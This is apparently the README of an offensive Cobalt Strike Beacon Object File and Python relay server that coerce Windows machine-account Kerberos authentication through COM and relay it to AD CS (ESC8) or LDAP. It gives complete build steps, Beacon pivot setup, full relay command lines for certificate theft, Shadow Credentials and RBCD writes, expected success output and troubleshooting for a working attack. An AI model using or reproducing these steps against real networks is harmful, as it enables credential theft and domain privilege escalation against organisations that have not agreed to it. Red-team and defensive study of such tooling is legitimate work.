# KrbRelay BOF
NOTE: This has only been tested on Cobalt Strike. The BOF spawns a new thread, so not all C2s play nice with that (i.e., might crash it)

A single-process Beacon Object File implementation of COM coercion and Kerberos relay. The BOF forwards machine-account authentication to a Python relay server for:

- AD CS Web Enrollment (ESC8) over HTTP or HTTPS
- Shadow Credentials over LDAP or LDAPS
- Resource-Based Constrained Delegation (RBCD) over LDAP or LDAPS

The Windows side is only a BOF. It does not upload an EXE, spawn a sacrificial process, inject code, or use sRDI/PIC.

The relay server stops after receiving the PFX or performing the directory write. It does not automatically request/import Kerberos tickets or execute the final S4U sequence.

## Build and load

```bash
make
```

This produces `bof/krbrelay.x64.o`. The default Makefile expects x64 MinGW-w64 at `/tmp/krb-mingw-root`; set `MINGW_PREFIX` if yours is elsewhere.

Load `krbrelay.cna` through Cobalt Strike's Script Manager. It adds:

```text
krbrelay <relay_port> <service_spn> <rpc_endpoint> [trigger_clsid]
```

- `relay_port`: Python listener and `rportfwd_local` port.
- `service_spn`: `http/CA_FQDN` or `ldap/DC_FQDN`.
- `rpc_endpoint`: free loopback TCP port used by the temporary COM resolver. This is not the relay port.
- `trigger_clsid`: optional COM activation class. The default is AxInstSv
  (`{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}`), which produced Kerberos auth
  type 16 at RPC auth level 2 on the tested fully patched Windows 11 host.

Known trigger CLSIDs are:

| COM class | CLSID | Platform availability | Current behavior |
| --- | --- | --- | --- |
| AxInstSv | `{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}` | Windows 10/11 | Default and verified in this lab. Produced SYSTEM/machine Kerberos type 16 at level 2, suitable for post-bind ShadowCred and RBCD over LDAP or LDAPS. |
| PrintNotify | `{854A20FB-2D44-457D-992F-EF13785D2B51}` | Windows 10/11 and Server 2016/2019/2022 | Produced packet-integrity authentication on the patched lab host. Retained as a negative control; it is not suitable for the current unsigned post-bind LDAP(S) operations. |
| McpManagementService | `{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}` | Windows 11 and Server 2022 | Former default. Its integrity-bearing exchange did not provide the working LDAPS path on the patched lab host; use for comparison and platform testing. |

The CLSID chooses only the privileged authentication source. ShadowCred, RBCD,
or AD CS is selected by the relay-server mode. Availability and RPC security
flags can vary by Windows build and service configuration, so the list is not
exhaustive; the BOF accepts any registered CLSID and prints the resulting
authentication type and level.

For LDAPS, use a fresh Beacon process so the BOF can establish the process-wide
CONNECT-level Kerberos COM policy. The BOF prints the actual RPC auth type and
level; LDAPS requires type `16` and level `2` or `3`.

## Network setup

If AD CS/the DC is reached through a Beacon pivot, use two Beacons. On the proxy/forward Beacon:

```text
sleep 0
socks 9050
rportfwd_local 9598 127.0.0.1 9598
```

Keep this Beacon and the Cobalt client that created `rportfwd_local` connected. Run Python on that same client and run the BOF on a separate x64 Beacon, normally at sleep `5`.

The relay server must be listening before executing `krbrelay`.

## ESC8 usage

From the relay directory:

```bash
cd relay
proxychains4 python3 relay_server.py esc8 \
  --port 9598 \
  --adcs-host CA.example.test --adcs-address 10.0.0.12 \
  --domain example.test --machine WORKSTATION \
  --template Machine \
  --pfx-out 'WORKSTATION-{request_id}.pfx'
```

Then run this on the KrbRelay Beacon:

```text
krbrelay 9598 http/CA.example.test 7989
```

For HTTPS Web Enrollment, add `--adcs-tls`. The SPN remains `http/CA.example.test`.

### ESC8 success output

```text
[*] IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account
[*] ADCS issued request <ID>; retrieving the certificate on the authenticated connection
[+] Saved passwordless machine PKCS#12 to WORKSTATION-<ID>.pfx
[+] Machine certificate acquired and key pair verified (request <ID>)
[+] AD CS relay completed
```

The PFX contains the issued certificate and matching private key.

## Shadow Credentials usage

From the relay directory:

```bash
cd relay
proxychains4 python3 relay_server.py shadowcred \
  --port 9598 \
  --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
  --domain example.test --machine WORKSTATION \
  --target-dn 'CN=WORKSTATION,OU=Workstations,DC=example,DC=test' \
  --padding-count 2 \
  --pfx-out 'shadow-{request_id}.pfx'
```

Then run:

```text
krbrelay 9598 ldap/DC01.example.test 7989
```

Expected success:

```text
[*] LDAP final bind succeeded; validating the queued directory write
[+] Added Shadow Credential to WORKSTATION$
[+] Saved passwordless shadow credential PKCS#12 to shadow-<ID>.pfx
[+] Shadow Credential DeviceId: <GUID>
[+] Shadow Credential KeyId: <SHA256 key identifier>
[+] Shadow Credential key pair acquired (shadow-<ID>)
[+] Shadow Credentials relay completed
```

Success requires result `0` for the final LDAP bind and at least one queued ModifyResponse. `--target-dn` identifies the exact computer object, including its OU. ShadowCred defaults to two identical KCL candidates (`--padding-count 2`) to give the final bind time to complete. Set it to `1` for the single-write, no-extra-padding baseline; higher values increase the padding when needed. Because each candidate contains the same DN-Binary value, successful padding does not create multiple separate Key Credential entries. The script will not overwrite an existing NGC Shadow Credential value.

For LDAPS, add `--ldap-port 636 --ldap-tls` and use the AxInstSv trigger (the
default). The low-layer Kerberos bind completes before the ModifyRequest, so
padding is unnecessary and `--padding-count 1` is sufficient.

## RBCD usage

RBCD requires the SID of an account you control that has an SPN, commonly a computer account whose password you know. From the relay directory:

```bash
cd relay
proxychains4 python3 relay_server.py rbcd \
  --port 9598 \
  --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
  --domain example.test --machine WORKSTATION \
  --target-dn 'CN=WORKSTATION,OU=Workstations,DC=example,DC=test' \
  --delegate-account CONTROLLED$ \
  --delegate-sid 'S-1-5-21-111111111-222222222-333333333-1234' \
  --padding-count 8
```

Then run:

```text
krbrelay 9598 ldap/DC01.example.test 7989
```

Expected success:

```text
[*] LDAP final bind succeeded; validating the queued directory write
[+] RBCD delegate added: CONTROLLED$ (S-1-5-21-...) -> WORKSTATION$
[+] RBCD relay completed
```

This replaces `msDS-AllowedToActOnBehalfOfOtherIdentity` with a descriptor containing repeated identical ACEs for the supplied SID. `--padding-count` controls the ACE count and defaults to `8`; set it to `1` for no extra ACE padding.

For LDAPS, add `--ldap-port 636 --ldap-tls` and use `--padding-count 1`.

## BOF success output

```text
[*] Initializing COM/RPC relay
[+] Existing Kerberos-capable COM security accepted
[*] Relay service principal: http/CA.example.test
[+] COM resolver ready: ncacn_ip_tcp:127.0.0.1[7989]
[*] Triggering operator-selected COM activation
[+] Relay bridge connected via 127.0.0.1:9598
[*] RPC auth type=16 level=2 ASC req=<flags> ret=<flags>
[*] Relayed authentication leg 1
[*] Applied relay continuation to authentication leg 1
[*] Relayed authentication leg 2
[+] Relay target authenticated the machine account
[+] Cleanup complete: resolver removed, SSPI restored, VEH removed
```

BOF success proves the target accepted the relayed account

## Repeating a relay

One BOF task performs one COM activation and one relay session. To repeat it:

1. Start a fresh relay server for the next session.
2. Execute `krbrelay` as a new Beacon task.

Reusing the same `service_spn` in separate tasks is supported. When changing between HTTP and LDAP SPNs, use another non-proxy Beacon because COM can retain process-wide authentication state.

## Troubleshooting

### Python never accepts the bridge

- Start Python before the BOF.
- Confirm the exact `rportfwd_local relay_port 127.0.0.1 relay_port` entry.
- Keep the rport Beacon at sleep `0`.

### Python cannot reach AD CS or the DC

- Confirm SOCKS is running and its local port matches the command.
- Run the relay server through proxychains so its outbound target connection uses the Beacon SOCKS route.
- The SPN hostname, IIS Host header, and selected service must agree.

### LDAP binds but modification fails

- Confirm the exact target DN and update rights.
- Shadow Credentials refuses an existing NGC value; remove only your controlled value before retrying.

### Direct LDAPS fails

Direct Kerberos SASL relay to LDAPS is unsupported. The coerced RPC context requests integrity, and AD rejects SASL integrity over TLS. Disabling EPA does not remove this restriction.

### BOF reports a COM/stage error

Change the `rpc_endpoint`

## Files

Only two components participate in a relay:

| File | Purpose |
| --- | --- |
| `bof/krbrelay.x64.o` | COM coercion, RPC resolver, SSPI interception, and KRB1 transport |
| `relay/relay_server.py` | Persistent AD CS/LDAP connection and selected action |

`krbrelay.cna` loads the object. `Makefile`, `bof/krbrelay.c`, and `bof/beacon.h` are needed only to rebuild it.

## Current support

| Mode | Status |
| --- | --- |
| Kerberos to AD CS HTTP/ESC8 | Working |
| Kerberos to AD CS HTTPS/ESC8 | Working |
| Kerberos to LDAP Shadow Credentials | Working when signing is not enforced |
| Kerberos to LDAP RBCD | Directory write working when signing is not enforced |
| Direct Kerberos relay to LDAPS | Not supported |
| LDAP with signing enforced | Not supported |

## References

- [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
